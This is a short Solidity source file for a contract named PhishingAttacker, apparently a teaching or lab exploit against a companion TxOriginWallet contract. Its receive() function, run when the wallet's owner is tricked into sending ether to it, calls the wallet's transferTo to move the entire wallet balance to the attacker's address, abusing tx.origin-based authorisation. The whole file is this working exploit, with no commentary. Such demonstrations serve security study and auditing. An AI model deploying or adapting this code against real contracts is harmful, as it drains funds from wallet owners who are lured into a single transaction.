// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {TxOriginWallet} from "./TxOriginWallet.sol";

contract PhishingAttacker {
    TxOriginWallet public wallet;
    address payable public attackerOwner;

    constructor(address payable _wallet) {
        wallet = TxOriginWallet(_wallet);
        attackerOwner = payable(msg.sender);
    }

    receive() external payable {
        wallet.transferTo(attackerOwner, address(wallet).balance);
    }
}
